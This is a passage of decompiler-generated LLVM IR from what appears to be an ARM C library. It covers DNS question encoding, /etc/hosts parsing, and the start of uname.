  %v3_135fc = inttoptr i32 %v2_135fc to i32*
  store i32 %v1_135f8, i32* %v3_135fc, align 4
  %v4_13600 = load i8, i8* %v3_135d4, align 1
  %div2 = udiv i8 %v4_13600, 2
  %tmp6 = urem i8 %div2, 2
  %v1_13608 = zext i8 %tmp6 to i32
  %v2_1360c = add i32 %arg2, 16
  %v3_1360c = inttoptr i32 %v2_1360c to i32*
  store i32 %v1_13608, i32* %v3_1360c, align 4
  %v4_13610 = load i8, i8* %v3_135d4, align 1
  %tmp7 = urem i8 %v4_13610, 2
  %v1_13614 = zext i8 %tmp7 to i32
  %v2_13618 = add i32 %arg2, 20
  %v3_13618 = inttoptr i32 %v2_13618 to i32*
  store i32 %v1_13614, i32* %v3_13618, align 4
  %v2_1361c = add i32 %tmp, 3
  %v3_1361c = inttoptr i32 %v2_1361c to i8*
  %v4_1361c = load i8, i8* %v3_1361c, align 1
  %tmp8 = icmp slt i8 %v4_1361c, 0
  %v3_13620 = zext i1 %tmp8 to i32
  %v2_13624 = add i32 %arg2, 24
  %v3_13624 = inttoptr i32 %v2_13624 to i32*
  store i32 %v3_13620, i32* %v3_13624, align 4
  %v4_13628 = load i8, i8* %v3_1361c, align 1
  %tmp9 = urem i8 %v4_13628, 16
  %v1_1362c = zext i8 %tmp9 to i32
  %v2_13630 = add i32 %arg2, 28
  %v3_13630 = inttoptr i32 %v2_13630 to i32*
  store i32 %v1_1362c, i32* %v3_13630, align 4
  %v2_13634 = add i32 %tmp, 4
  %v3_13634 = inttoptr i32 %v2_13634 to i8*
  %v4_13634 = load i8, i8* %v3_13634, align 1
  %v5_13634 = zext i8 %v4_13634 to i32
  %v2_13638 = add i32 %tmp, 5
  %v3_13638 = inttoptr i32 %v2_13638 to i8*
  %v4_13638 = load i8, i8* %v3_13638, align 1
  %v5_13638 = zext i8 %v4_13638 to i32
  %v4_1363c = mul nuw nsw i32 %v5_13634, 256
  %v5_1363c = or i32 %v5_13638, %v4_1363c
  %v2_13640 = add i32 %arg2, 32
  %v3_13640 = inttoptr i32 %v2_13640 to i32*
  store i32 %v5_1363c, i32* %v3_13640, align 4
  %v2_13644 = add i32 %tmp, 6
  %v3_13644 = inttoptr i32 %v2_13644 to i8*
  %v4_13644 = load i8, i8* %v3_13644, align 1
  %v5_13644 = zext i8 %v4_13644 to i32
  %v2_13648 = add i32 %tmp, 7
  %v3_13648 = inttoptr i32 %v2_13648 to i8*
  %v4_13648 = load i8, i8* %v3_13648, align 1
  %v5_13648 = zext i8 %v4_13648 to i32
  %v4_1364c = mul nuw nsw i32 %v5_13644, 256
  %v5_1364c = or i32 %v5_13648, %v4_1364c
  %v2_13650 = add i32 %arg2, 36
  %v3_13650 = inttoptr i32 %v2_13650 to i32*
  store i32 %v5_1364c, i32* %v3_13650, align 4
  %v2_13654 = add i32 %tmp, 8
  %v3_13654 = inttoptr i32 %v2_13654 to i8*
  %v4_13654 = load i8, i8* %v3_13654, align 1
  %v5_13654 = zext i8 %v4_13654 to i32
  %v2_13658 = add i32 %tmp, 9
  %v3_13658 = inttoptr i32 %v2_13658 to i8*
  %v4_13658 = load i8, i8* %v3_13658, align 1
  %v5_13658 = zext i8 %v4_13658 to i32
  %v4_1365c = mul nuw nsw i32 %v5_13654, 256
  %v5_1365c = or i32 %v5_13658, %v4_1365c
  %v2_13660 = add i32 %arg2, 40
  %v3_13660 = inttoptr i32 %v2_13660 to i32*
  store i32 %v5_1365c, i32* %v3_13660, align 4
  %v2_13664 = add i32 %tmp, 11
  %v3_13664 = inttoptr i32 %v2_13664 to i8*
  %v4_13664 = load i8, i8* %v3_13664, align 1
  %v5_13664 = zext i8 %v4_13664 to i32
  %v2_13668 = add i32 %tmp, 10
  %v3_13668 = inttoptr i32 %v2_13668 to i8*
  %v4_13668 = load i8, i8* %v3_13668, align 1
  %v5_13668 = zext i8 %v4_13668 to i32
  %v4_1366c = mul nuw nsw i32 %v5_13668, 256
  %v5_1366c = or i32 %v4_1366c, %v5_13664
  %v2_13670 = add i32 %arg2, 44
  %v3_13670 = inttoptr i32 %v2_13670 to i32*
  store i32 %v5_1366c, i32* %v3_13670, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 11, { 16, 17, 4, 9, 1, 2, 3, 10, 11, 12, 13, 14, 15, 0, 5, 18, 6, 7, 8, 19 }
  uselistorder i32 7, { 11, 12, 7, 8, 9, 0, 10, 1, 2, 5, 6, 4, 3, 13 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13678 = load i32, i32* @r4, align 4
  store i32 %v3_13678, i32* %stack_var_-16, align 4
  %v9_13678 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_13680 = load i32, i32* %arg1, align 4
  store i32 %v2_13680, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_1368c = inttoptr i32 %v2_13680 to i8*
  %v2_1368c = call i32 @__encode_dotted(i8* %v1_1368c)
  store i32 %v2_1368c, i32* %r0.global-to-local, align 4
  %v1_13690 = icmp slt i32 %v2_1368c, 0
  br i1 %v1_13690, label %dec_label_pc_136d0, label %dec_label_pc_13698

dec_label_pc_13698:                               ; preds = %entry
  %v1_13698 = load i32, i32* @r5, align 4
  %v2_13698 = sub i32 %v1_13698, %v2_1368c
  %v7_136a0 = icmp slt i32 %v2_13698, 4
  br i1 %v7_136a0, label %bb, label %dec_label_pc_136a8

bb:                                               ; preds = %dec_label_pc_13698
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_136d0

dec_label_pc_136a8:                               ; preds = %dec_label_pc_13698
  %v0_136a8 = load i32, i32* @r4, align 4
  %v1_136a8 = add i32 %v0_136a8, 5
  %v2_136a8 = inttoptr i32 %v1_136a8 to i8*
  %v3_136a8 = load i8, i8* %v2_136a8, align 1
  %v2_136ac = load i32, i32* @r6, align 4
  %v4_136ac = add i32 %v2_136ac, %v2_1368c
  %v5_136ac = inttoptr i32 %v4_136ac to i8*
  store i8 %v3_136a8, i8* %v5_136ac, align 1
  %v0_136b0 = load i32, i32* @r4, align 4
  %v1_136b0 = add i32 %v0_136b0, 4
  %v2_136b0 = inttoptr i32 %v1_136b0 to i32*
  %v3_136b0 = load i32, i32* %v2_136b0, align 4
  %v0_136b4 = load i32, i32* @r6, align 4
  %v1_136b4 = load i32, i32* %r0.global-to-local, align 4
  %v2_136b4 = add i32 %v1_136b4, %v0_136b4
  store i32 %v2_136b4, i32* %r2.global-to-local, align 4
  %v1_136b8 = trunc i32 %v3_136b0 to i8
  %v3_136b8 = add i32 %v2_136b4, 1
  %v4_136b8 = inttoptr i32 %v3_136b8 to i8*
  store i8 %v1_136b8, i8* %v4_136b8, align 1
  %v0_136bc = load i32, i32* @r4, align 4
  %v1_136bc = add i32 %v0_136bc, 9
  %v2_136bc = inttoptr i32 %v1_136bc to i8*
  %v3_136bc = load i8, i8* %v2_136bc, align 1
  %v2_136c0 = load i32, i32* %r2.global-to-local, align 4
  %v3_136c0 = add i32 %v2_136c0, 2
  %v4_136c0 = inttoptr i32 %v3_136c0 to i8*
  store i8 %v3_136bc, i8* %v4_136c0, align 1
  %v0_136c4 = load i32, i32* @r4, align 4
  %v1_136c4 = add i32 %v0_136c4, 8
  %v2_136c4 = inttoptr i32 %v1_136c4 to i32*
  %v3_136c4 = load i32, i32* %v2_136c4, align 4
  %v1_136c8 = trunc i32 %v3_136c4 to i8
  %v2_136c8 = load i32, i32* %r2.global-to-local, align 4
  %v3_136c8 = add i32 %v2_136c8, 3
  %v4_136c8 = inttoptr i32 %v3_136c8 to i8*
  store i8 %v1_136c8, i8* %v4_136c8, align 1
  %v0_136cc = load i32, i32* %r0.global-to-local, align 4
  %v1_136cc = add i32 %v0_136cc, 4
  store i32 %v1_136cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_136d0

dec_label_pc_136d0:                               ; preds = %bb, %entry, %dec_label_pc_136a8
  %v1_136d4 = phi i32 [ -1, %bb ], [ %v2_1368c, %entry ], [ %v1_136cc, %dec_label_pc_136a8 ]
  %v2_136d0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_136d0, i32* @r4, align 4
  store i32 %v9_13678, i32* @r6, align 4
  ret i32 %v1_136d4

; uselistorder directives
  uselistorder i32 %v2_1368c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder i32 5, { 19, 20, 21, 4, 13, 5, 1, 14, 15, 6, 16, 0, 7, 22, 8, 2, 17, 9, 18, 11, 10, 3, 23, 12 }
  uselistorder label %dec_label_pc_136d0, { 2, 0, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -34096), i32* @r0, align 4
  %v1_136f0 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -34096))
  ret i32 %v1_136f0

; uselistorder directives
  uselistorder i32 (i32)* @__GI_config_open, { 0, 2, 1 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_13708 = load i32, i32* @r4, align 4
  %v6_13708 = load i32, i32* @r5, align 4
  %v9_13708 = load i32, i32* @r6, align 4
  %v12_13708 = load i32, i32* @r7, align 4
  %v15_13708 = load i32, i32* @r8, align 4
  %v18_13708 = load i32, i32* @sb, align 4
  %v21_13708 = load i32, i32* @sl, align 4
  %v24_13708 = load i32, i32* @fp, align 4
  store i32 %tmp10, i32* @r5, align 4
  store i32 %tmp9, i32* @lr, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 -1, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r4, align 4
  %v2_13730 = inttoptr i32 %tmp9 to i32*
  store i32 -1, i32* %v2_13730, align 4
  %v0_13734 = load i32, i32* @r0, align 4
  store i32 %v0_13734, i32* @r6, align 4
  %v0_13738 = load i32, i32* @r1, align 4
  %v0_1373c = load i32, i32* @r2, align 4
  store i32 %v0_1373c, i32* @r8, align 4
  %v0_13740 = load i32, i32* @r3, align 4
  store i32 %v0_13740, i32* @fp, align 4
  %v3_13744 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_13744, i32* @r7, align 4
  %tmp = icmp ult i32 %tmp10, 129
  br i1 %tmp, label %.thread, label %dec_label_pc_13750

.thread:                                          ; preds = %entry
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_138f0

dec_label_pc_13750:                               ; preds = %entry
  %v2_13750 = icmp eq i32 %v0_13734, 0
  br i1 %v2_13750, label %dec_label_pc_13758, label %dec_label_pc_13778

dec_label_pc_13758:                               ; preds = %dec_label_pc_13750
  %v0_13758 = call i32 @__open_etc_hosts()
  store i32 %v0_13758, i32* @r6, align 4
  %v2_1375c = icmp eq i32 %v0_13758, 0
  br i1 %v2_1375c, label %dec_label_pc_13764, label %dec_label_pc_13778

dec_label_pc_13764:                               ; preds = %dec_label_pc_13758
  store i32 %tmp7, i32* %r2.global-to-local, align 4
  %v2_13768 = inttoptr i32 %tmp7 to i32*
  store i32 0, i32* %v2_13768, align 4
  %v0_1376c = call i32 @__GI___errno_location()
  %v1_13770 = inttoptr i32 %v0_1376c to i32*
  %v2_13770 = load i32, i32* %v1_13770, align 4
  store i32 %v2_13770, i32* @sb, align 4
  br label %dec_label_pc_138f0

dec_label_pc_13778:                               ; preds = %dec_label_pc_13758, %dec_label_pc_13750
  %v1_13798 = phi i32 [ %v0_13758, %dec_label_pc_13758 ], [ %v0_13734, %dec_label_pc_13750 ]
  %v0_1377c = load i32, i32* @r4, align 4
  %v2_1377c = add i32 %v0_1377c, -34084
  store i32 %v2_1377c, i32* @r4, align 4
  %v2_13780 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp6, i32* %ip.global-to-local, align 4
  store i32 %tmp6, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_13798 = add i32 %v1_13798, 8
  %v3_13798 = inttoptr i32 %v2_13798 to i32*
  store i32 48, i32* %v3_13798, align 4
  store i32 %tmp9, i32* %r3.global-to-local, align 4
  %v0_137a0 = load i32, i32* @r5, align 4
  %v1_137a0 = add i32 %v0_137a0, -48
  store i32 %v1_137a0, i32* %r1.global-to-local, align 4
  %v0_137a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_137a4 = add i32 %v0_137a4, 24
  store i32 %v1_137a4, i32* @ip, align 4
  %v0_137a8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_137a8, i32* @sb, align 4
  %v0_137ac = load i32, i32* @lr, align 4
  %v1_137ac = add i32 %v0_137ac, 32
  store i32 %v1_137ac, i32* @sl, align 4
  %v1_137b0 = load i32, i32* @r6, align 4
  %v2_137b0 = add i32 %v1_137b0, 16
  %v3_137b0 = inttoptr i32 %v2_137b0 to i32*
  store i32 %v1_137a0, i32* %v3_137b0, align 4
  %v0_137b4 = load i32, i32* @r4, align 4
  %v0_137b8 = load i32, i32* @ip, align 4
  store i32 %v0_137b8, i32* %stack_var_-64, align 4
  %v0_137bc = load i32, i32* %r2.global-to-local, align 4
  %v1_137bc = load i32, i32* %r3.global-to-local, align 4
  %v2_137bc = inttoptr i32 %v1_137bc to i32*
  store i32 %v0_137bc, i32* %v2_137bc, align 4
  %v0_137c0 = load i32, i32* @lr, align 4
  %v1_137c0 = load i32, i32* @r6, align 4
  %v2_137c0 = add i32 %v1_137c0, 4
  %v3_137c0 = inttoptr i32 %v2_137c0 to i32*
  store i32 %v0_137c0, i32* %v3_137c0, align 4
  %v2_137f0 = inttoptr i32 %v0_13738 to i8*
  br label %dec_label_pc_138c4

dec_label_pc_137c8:                               ; preds = %dec_label_pc_138c4
  %v3_137c8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_137c8, i32* %r1.global-to-local, align 4
  %v0_137cc = load i32, i32* @fp, align 4
  %v7_137cc = icmp eq i32 %v0_137cc, 1
  %v1_137d0 = add i32 %v3_137c8, 4
  store i32 %v1_137d0, i32* @r5, align 4
  %v1_137d4 = load i32, i32* @r7, align 4
  %v2_137d4 = add i32 %v1_137d4, 4
  %v3_137d4 = inttoptr i32 %v2_137d4 to i32*
  store i32 %v1_137d0, i32* %v3_137d4, align 4
  br i1 %v7_137cc, label %dec_label_pc_138f0, label %dec_label_pc_137dc

dec_label_pc_137dc:                               ; preds = %dec_label_pc_137c8
  %v0_137dc = load i32, i32* @fp, align 4
  %v7_137dc = icmp eq i32 %v0_137dc, 2
  br i1 %v7_137dc, label %dec_label_pc_137e8, label %dec_label_pc_1380c.preheader

dec_label_pc_1380c.preheader:                     ; preds = %dec_label_pc_137dc
  %v1_137e0 = load i32, i32* @r5, align 4
  %v1_1380c25 = inttoptr i32 %v1_137e0 to i32*
  %v2_1380c26 = load i32, i32* %v1_1380c25, align 4
  store i32 %v2_1380c26, i32* %r3.global-to-local, align 4
  store i32 %v2_1380c26, i32* %r1.global-to-local, align 4
  %v2_1381028 = icmp eq i32 %v2_1380c26, 0
  %v1_1381829 = add i32 %v1_137e0, 4
  store i32 %v1_1381829, i32* @r4, align 4
  br i1 %v2_1381028, label %dec_label_pc_138c4, label %dec_label_pc_13800

dec_label_pc_137e8:                               ; preds = %dec_label_pc_137dc
  %v0_137e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_137e8 = inttoptr i32 %v0_137e8 to i32*
  %v2_137e8 = load i32, i32* %v1_137e8, align 4
  store i32 %v2_137e8, i32* @r1, align 4
  %v3_137f0 = call i32 @__GI_strcoll(i8* %v2_137f0, i32 %v2_137e8)
  %v2_137f4 = icmp eq i32 %v3_137f0, 0
  br i1 %v2_137f4, label %dec_label_pc_13824, label %dec_label_pc_138c4

dec_label_pc_13800:                               ; preds = %dec_label_pc_1380c.preheader, %dec_label_pc_13800.dec_label_pc_1380c_crit_edge
  %v2_1380c30 = phi i32 [ %v2_1380c, %dec_label_pc_13800.dec_label_pc_1380c_crit_edge ], [ %v2_1380c26, %dec_label_pc_1380c.preheader ]
  %v3_13800 = call i32 @__GI_strcasecmp(i8* %v2_137f0, i32 %v2_1380c30)
  %v2_13804 = icmp eq i32 %v3_13800, 0
  br i1 %v2_13804, label %dec_label_pc_13824, label %dec_label_pc_13800.dec_label_pc_1380c_crit_edge

dec_label_pc_13800.dec_label_pc_1380c_crit_edge:  ; preds = %dec_label_pc_13800
  %v0_1380c.pre = load i32, i32* @r4, align 4
  %v1_1380c = inttoptr i32 %v0_1380c.pre to i32*
  %v2_1380c = load i32, i32* %v1_1380c, align 4
  store i32 %v2_1380c, i32* %r3.global-to-local, align 4
  store i32 %v2_1380c, i32* %r1.global-to-local, align 4
  %v2_13810 = icmp eq i32 %v2_1380c, 0
  %v1_13818 = add i32 %v0_1380c.pre, 4
  store i32 %v1_13818, i32* @r4, align 4
  br i1 %v2_13810, label %dec_label_pc_138c4, label %dec_label_pc_13800

dec_label_pc_13824:                               ; preds = %dec_label_pc_13800, %dec_label_pc_137e8
  %v0_13824 = load i32, i32* @r5, align 4
  %v1_13824 = inttoptr i32 %v0_13824 to i32*
  %v2_13824 = load i32, i32* %v1_13824, align 4
  store i32 %v2_13824, i32* %r3.global-to-local, align 4
  %v4_13824 = add i32 %v0_13824, 4
  store i32 %v4_13824, i32* @r5, align 4
  %v2_13828 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_13828, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v1_13830 = load i32, i32* @r7, align 4
  %v2_13830 = inttoptr i32 %v1_13830 to i32*
  store i32 %v2_13824, i32* %v2_13830, align 4
  %v0_13834 = load i32, i32* @lr, align 4
  %v1_13834 = load i32, i32* @ip, align 4
  %v2_13834 = add i32 %v1_13834, 4
  %v3_13834 = inttoptr i32 %v2_13834 to i32*
  store i32 %v0_13834, i32* %v3_13834, align 4
  store i32 %tmp6, i32* %r2.global-to-local, align 4
  %v0_1383c = load i32, i32* @r8, align 4
  %v7_1383c = icmp eq i32 %v0_1383c, 2
  %v0_13840 = load i32, i32* @r5, align 4
  %v1_13840 = load i32, i32* @r7, align 4
  %v2_13840 = add i32 %v1_13840, 4
  %v3_13840 = inttoptr i32 %v2_13840 to i32*
  store i32 %v0_13840, i32* %v3_13840, align 4
  %v0_13844 = load i32, i32* @ip, align 4
  %v1_13844 = load i32, i32* @r7, align 4
  %v2_13844 = add i32 %v1_13844, 16
  %v3_13844 = inttoptr i32 %v2_13844 to i32*
  store i32 %v0_13844, i32* %v3_13844, align 4
  %v0_13848 = load i32, i32* @sl, align 4
  %v1_13848 = load i32, i32* %r2.global-to-local, align 4
  %v2_13848 = add i32 %v1_13848, 24
  %v3_13848 = inttoptr i32 %v2_13848 to i32*
  store i32 %v0_13848, i32* %v3_13848, align 4
  br i1 %v7_1383c, label %dec_label_pc_13850, label %dec_label_pc_13880

dec_label_pc_13850:                               ; preds = %dec_label_pc_13824
  %v3_13850 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_13850, i32* %r3.global-to-local, align 4
  %v0_13854 = load i32, i32* @r8, align 4
  %v1_13858 = inttoptr i32 %v3_13850 to i32*
  %v2_13858 = load i32, i32* %v1_13858, align 4
  store i32 %v2_13858, i32* %r1.global-to-local, align 4
  %v0_1385c = load i32, i32* @sl, align 4
  store i32 %v0_1385c, i32* %r2.global-to-local, align 4
  %v3_13860 = inttoptr i32 %v2_13858 to i8*
  %v4_13860 = call i32 @inet_pton(i32 %v0_13854, i8* %v3_13860, i32 %v0_1385c)
  %tmp23 = icmp slt i32 %v4_13860, 1
  br i1 %tmp23, label %dec_label_pc_138c0, label %dec_label_pc_1386c

dec_label_pc_1386c:                               ; preds = %dec_label_pc_13850
  %v0_13870 = load i32, i32* @r7, align 4
  %v2_13870 = inttoptr i32 %tmp7 to i32*
  store i32 %v0_13870, i32* %v2_13870, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_13878 = load i32, i32* @r8, align 4
  %v1_13878 = load i32, i32* @r7, align 4
  %v2_13878 = add i32 %v1_13878, 8
  %v3_13878 = inttoptr i32 %v2_13878 to i32*
  store i32 %v0_13878, i32* %v3_13878, align 4
  %v0_138b8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_138b4

dec_label_pc_13880:                               ; preds = %dec_label_pc_13824
  %v0_13880 = load i32, i32* @r8, align 4
  %v7_13880 = icmp eq i32 %v0_13880, 10
  br i1 %v7_13880, label %dec_label_pc_13888, label %dec_label_pc_138c0

dec_label_pc_13888:                               ; preds = %dec_label_pc_13880
  %v3_13888 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_13888, i32* %r3.global-to-local, align 4
  %v1_13890 = inttoptr i32 %v3_13888 to i32*
  %v2_13890 = load i32, i32* %v1_13890, align 4
  store i32 %v2_13890, i32* %r1.global-to-local, align 4
  %v0_13894 = load i32, i32* @sl, align 4
  store i32 %v0_13894, i32* %r2.global-to-local, align 4
  %v3_13898 = inttoptr i32 %v2_13890 to i8*
  %v4_13898 = call i32 @inet_pton(i32 10, i8* %v3_13898, i32 %v0_13894)
  %tmp24 = icmp slt i32 %v4_13898, 1
  br i1 %tmp24, label %dec_label_pc_138c0, label %dec_label_pc_138a4

dec_label_pc_138a4:                               ; preds = %dec_label_pc_13888
  store i32 %tmp7, i32* @ip, align 4
  %v0_138a8 = load i32, i32* @r8, align 4
  %v1_138a8 = load i32, i32* @r7, align 4
  %v2_138a8 = add i32 %v1_138a8, 8
  %v3_138a8 = inttoptr i32 %v2_138a8 to i32*
  store i32 %v0_138a8, i32* %v3_138a8, align 4
  %v0_138ac = load i32, i32* @r7, align 4
  %v1_138ac = load i32, i32* @ip, align 4
  %v2_138ac = inttoptr i32 %v1_138ac to i32*
  store i32 %v0_138ac, i32* %v2_138ac, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_138b4

dec_label_pc_138b4:                               ; preds = %dec_label_pc_1386c, %dec_label_pc_138a4
  %v0_138b8 = phi i32 [ %v0_138b8.pre, %dec_label_pc_1386c ], [ 16, %dec_label_pc_138a4 ]
  store i32 0, i32* @sb, align 4
  %v1_138b8 = load i32, i32* @r7, align 4
  %v2_138b8 = add i32 %v1_138b8, 12
  %v3_138b8 = inttoptr i32 %v2_138b8 to i32*
  store i32 %v0_138b8, i32* %v3_138b8, align 4
  br label %dec_label_pc_138e8

dec_label_pc_138c0:                               ; preds = %dec_label_pc_13880, %dec_label_pc_13888, %dec_label_pc_13850
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_138c4

dec_label_pc_138c4:                               ; preds = %dec_label_pc_1380c.preheader, %dec_label_pc_13800.dec_label_pc_1380c_crit_edge, %dec_label_pc_137e8, %dec_label_pc_138c0, %dec_label_pc_13778
  %v0_138c4 = load i32, i32* @r6, align 4
  store i32 %v2_13780, i32* %r1.global-to-local, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 %v0_137b4, i32* %r3.global-to-local, align 4
  %v4_138d4 = inttoptr i32 %v0_138c4 to i32*
  %v5_138d4 = call i32 @__GI_config_read(i32* %v4_138d4, i32 %v2_13780, i32 459270, i32 %v0_137b4)
  %v2_138d8 = icmp eq i32 %v5_138d4, 0
  br i1 %v2_138d8, label %dec_label_pc_138e0, label %dec_label_pc_137c8

dec_label_pc_138e0:                               ; preds = %dec_label_pc_138c4
  %v0_138e0 = load i32, i32* @fp, align 4
  %v7_138e0 = icmp eq i32 %v0_138e0, 1
  br i1 %v7_138e0, label %dec_label_pc_138f0, label %dec_label_pc_138e8

dec_label_pc_138e8:                               ; preds = %dec_label_pc_138e0, %dec_label_pc_138b4
  %v0_138e8 = load i32, i32* @r6, align 4
  %v1_138ec = inttoptr i32 %v0_138e8 to i32*
  %v2_138ec = call i32 @__GI_config_close(i32* %v1_138ec)
  br label %dec_label_pc_138f0

dec_label_pc_138f0:                               ; preds = %dec_label_pc_137c8, %.thread, %dec_label_pc_138e0, %dec_label_pc_13764, %dec_label_pc_138e8
  %v0_138f0 = load i32, i32* @sb, align 4
  store i32 %v3_13708, i32* @r4, align 4
  store i32 %v6_13708, i32* @r5, align 4
  store i32 %v9_13708, i32* @r6, align 4
  store i32 %v12_13708, i32* @r7, align 4
  store i32 %v15_13708, i32* @r8, align 4
  store i32 %v18_13708, i32* @sb, align 4
  store i32 %v21_13708, i32* @sl, align 4
  store i32 %v24_13708, i32* @fp, align 4
  ret i32 %v0_138f0

; uselistorder directives
  uselistorder i32 %v2_1380c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1380c.pre, { 1, 0 }
  uselistorder i32 %v0_137b4, { 1, 0 }
  uselistorder i32 %v2_13780, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp9, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 3, 2, 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0, 9, 10 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 0, 5, 7 }
  uselistorder i32 (i32*)* @__GI_config_close, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 2, 0, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 2, 3, 4, 5, 6, 7, 8, 0, 9, 1 }
  uselistorder i32 -48, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 34, { 6, 5, 7, 8, 9, 1, 2, 0, 4, 10, 3, 11 }
  uselistorder i32* @fp, { 26, 27, 28, 29, 38, 39, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 40, 41, 42, 43, 44, 45, 46, 47, 0, 52, 62, 63, 64, 65, 66, 67, 68, 69, 70, 17, 18, 48, 49, 50, 51, 71, 72, 73, 1, 74, 75, 76, 77, 78, 53, 54, 55, 56, 57, 58, 59, 60, 61, 30, 31, 32, 33, 34, 35, 36, 37, 2, 81, 83, 82, 84, 19, 20, 21, 22, 23, 24, 25, 79, 80, 85, 86, 87, 88, 89, 90, 97, 98, 96, 91, 92, 93, 94, 95, 99, 100, 101, 102, 3 }
  uselistorder i32* @sl, { 29, 30, 31, 32, 38, 39, 8, 9, 10, 11, 12, 13, 14, 1, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 40, 41, 42, 43, 44, 45, 46, 47, 54, 55, 56, 57, 58, 0, 59, 2, 60, 61, 62, 63, 64, 65, 66, 67, 68, 25, 26, 48, 49, 50, 51, 52, 53, 69, 70, 71, 72, 73, 74, 75, 76, 33, 34, 35, 36, 37, 5, 6, 27, 28, 77, 78, 79, 3, 80, 81, 82, 83, 84, 85, 87, 4, 86, 89, 88, 90, 91, 92, 93, 7 }
  uselistorder i32* @sb, { 16, 17, 18, 19, 24, 25, 26, 27, 5, 6, 7, 8, 9, 10, 11, 0, 12, 28, 29, 42, 30, 31, 32, 2, 33, 70, 71, 3, 72, 73, 74, 75, 76, 77, 78, 13, 14, 15, 34, 35, 36, 37, 38, 39, 40, 41, 79, 80, 81, 82, 83, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 1, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 20, 21, 22, 23, 84, 87, 85, 86, 88, 4 }
  uselistorder i32* @r8, { 28, 29, 30, 31, 32, 33, 38, 39, 12, 13, 14, 15, 16, 17, 1, 18, 0, 19, 20, 21, 6, 7, 40, 41, 42, 43, 44, 45, 46, 47, 48, 51, 57, 60, 61, 62, 63, 64, 65, 2, 66, 67, 68, 69, 70, 71, 22, 23, 24, 52, 53, 3, 54, 55, 56, 72, 73, 74, 75, 76, 77, 78, 58, 59, 49, 50, 34, 35, 36, 37, 25, 26, 27, 8, 9, 4, 10, 79, 80, 81, 82, 83, 5, 84, 85, 86, 87, 88, 89, 90, 91, 11 }
  uselistorder label %dec_label_pc_138f0, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_138c4, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_138c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_138b4, { 1, 0 }
  uselistorder label %dec_label_pc_13800, { 1, 0 }
}

define i32 @uname(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1390c = load i32, i32* @r7, align 4
